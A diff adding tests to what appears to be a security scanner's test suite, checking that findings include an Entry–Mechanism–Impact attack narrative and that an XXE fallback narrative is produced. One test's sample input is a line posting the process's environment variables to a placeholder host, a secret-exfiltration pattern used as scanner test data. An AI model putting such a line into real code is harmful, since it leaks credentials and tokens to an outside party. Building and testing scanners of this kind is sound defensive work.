@@ -266,6 +266,21 @@ def test_webapp_rejects_oversized_input():
     assert r["ok"] is False and "too large" in r["error"]
 
 
+def test_webapp_finding_has_attack_narrative():
+    from webapp import build_scan_response
+    r = build_scan_response("import os, requests\nrequests.post('https://e', data=os.environ)")
+    f = r["findings"][0]
+    steps = f.get("narrative", [])
+    assert len(steps) >= 3
+    assert steps[0].startswith("Entry") and steps[1].startswith("Mechanism") and steps[2].startswith("Impact")
+
+
+def test_attack_narrative_generic_fallback():
+    from findings import attack_narrative, get_meta
+    steps = attack_narrative("XXE", get_meta("XXE"))
+    assert len(steps) == 3 and all(s.split(" ")[0] in ("Entry", "Mechanism", "Impact") for s in steps)
+
+
 def test_webapp_multifile_cross_file_taint():
     from webapp import build_files_response
     r = build_files_response({
